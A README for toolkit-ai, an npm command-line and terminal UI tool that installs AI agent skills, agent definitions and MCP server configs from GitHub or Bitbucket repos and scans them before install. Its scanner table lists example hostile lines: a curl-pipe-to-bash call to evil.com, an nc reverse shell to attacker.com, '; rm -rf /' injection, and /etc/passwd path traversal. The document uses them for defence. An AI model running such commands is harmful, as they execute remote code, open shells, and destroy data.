
<div align="center">

```
████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
   ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║
   ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║
   ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
```

**toolkit-ai**

Manage AI skills, agents, and MCPs across Claude Code, Copilot, and Cursor — from any GitHub or Bitbucket source.

[![npm](https://img.shields.io/npm/v/toolkit-ai)](https://www.npmjs.com/package/toolkit-ai)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

</div>

---

## Install

```bash
npx toolkit-ai            # run directly, no install
npm install -g toolkit-ai  # or install globally
```

## What It Does

A source-driven CLI with an interactive TUI that lets you browse, install, and manage AI development resources from GitHub and Bitbucket repos — all in one place.

| Resource | What it is | Installs to |
|----------|-----------|-------------|
| **Skills** | Markdown instructions that teach AI agents new capabilities | `~/.claude/skills/` `~/.copilot/skills/` |
| **Agents** | Specialized agent definitions with tool access | `~/.claude/agents/` `~/.copilot/agents/` |
| **MCPs** | Model Context Protocol server connections | `settings.json` / `mcp.json` |

All resources come from configured external sources (GitHub/Bitbucket repos). No bundled content — you control what gets installed.

## TUI

Run `ai-toolkit` with no arguments to launch the interactive interface:

```
ai-toolkit
```

| Tab | What you do |
|-----|-------------|
| **Catalog** | Browse, search, filter, install, update all resources from all sources |
| **Installed** | View, inspect, and remove installed items |
| **Sources** | Add/remove repos, browse items per source, refresh caches |

### Keyboard shortcuts

**Global:** `Tab` switch tabs · `q` quit

**Catalog & Installed:**
| Key | Action |
|-----|--------|
| `↑` `↓` | Navigate |
| `/` | Search |
| `1`-`4` | Filter by type (Skills / Agents / MCPs / Plugins) |
| `0` | Reset filter to All |
| `Space` | Toggle selection |
| `Enter` | Detail view (or submit if items selected) |
| `a` | Select / deselect all |
| `i` | Install current item |
| `r` | Remove current item (with confirmation) |
| `u` | Update current item |
| `U` | Update all |

**Sources:**
| Key | Action |
|-----|--------|
| `Enter` | Browse items from selected source |
| `a` | Add a new source |
| `d` | Delete selected source |
| `f` | Refresh all sources (re-fetch repos) |

## CLI

```bash
ai-toolkit --list                     # List all available items
ai-toolkit --skill <name>             # Install a skill
ai-toolkit --agent <name>             # Install an agent
ai-toolkit --mcp <name>               # Register an MCP server
ai-toolkit remove --skill <name>      # Remove a skill
ai-toolkit check                      # Check for updates
ai-toolkit update                     # Update all installed items
ai-toolkit refresh                    # Re-fetch all external sources
ai-toolkit scan                       # Security scan all items
ai-toolkit init [dir]                 # Scaffold a new skill repo
```

## External Sources

All content comes from external repos. Add any GitHub or Bitbucket repo as a source:

```bash
# In the TUI: Sources tab → press 'a'
# Or via CLI:
ai-toolkit source add owner/repo
ai-toolkit source add https://github.com/owner/repo
```

The toolkit discovers resources in source repos by convention:

| Resource | Discovered by |
|----------|--------------|
| **Skills** | Any directory containing a `SKILL.md` file (recursive) |
| **Agents** | Any `*.agent.md` file (recursive) |
| **MCPs** | Any `*.json` in a `mcps/` directory, or `*.mcp.json` anywhere |

Sources are shallow-cloned and cached for 24 hours at `~/.toolkit/cache/`. Press `f` in the Sources tab or run `ai-toolkit refresh` to force a re-fetch.

### Default sources

The toolkit ships with two default sources:

```json
{
  "sources": [
    { "name": "vercel-labs", "type": "github", "repo": "vercel-labs/agent-skills" },
    { "name": "anthropics", "type": "github", "repo": "anthropics/skills" }
  ]
}
```

## Security Scanner

Every item is automatically scanned before installation.

### What gets blocked

| Threat | Example |
|--------|---------|
| **Remote code execution** | `curl https://evil.com/x.sh \| bash` |
| **Reverse shells** | `nc -e /bin/sh attacker.com 4444` |
| **Encoded PowerShell** | `powershell -enc SGVsbG8=` |
| **Invisible prompt injection** | Zero-width unicode characters |
| **Bidi text manipulation** | RTL/LTR override characters |
| **Path traversal** | `../../../etc/passwd` in file paths |
| **Symlink escape** | Symlink pointing to `~/.ssh/` |
| **Malicious MCP URLs** | `file:///etc/passwd`, `http://10.0.0.1` |
| **MCP command injection** | URL containing `; rm -rf /` |

### Scan in the TUI

- **Red `✕ blocked`** — dangerous content detected, install prevented
- **Yellow `⚠`** — warnings (informational only)

Press `Enter` on any item to see the full scan report in the detail view. Use `--force` to override a blocked install if you've reviewed the content.

## Create Your Own Skills

Scaffold a boilerplate repo to publish your own resources:

```bash
ai-toolkit init my-skills
```

This creates a repo structure that the toolkit can discover:

```
my-skills/
  skills/
    example-skill/SKILL.md
  agents/
    example-agent.agent.md
  mcps/
    example-mcp.json
  README.md
```

Push to GitHub, then share:

```bash
ai-toolkit source add your-org/my-skills
```

## Development

```bash
git clone https://github.com/barleviatias/toolkit.git
cd toolkit
npm install
npm run build    # Build → bin/ai-toolkit.mjs
npm run dev      # Build with watch
npm test         # Lint skills + validate catalog
npm link         # Link globally for testing
```

## Tech Stack

- **React Ink** — terminal UI framework
- **tsup** — bundles into a single zero-dependency executable
- **TypeScript** — full type safety

## License

MIT
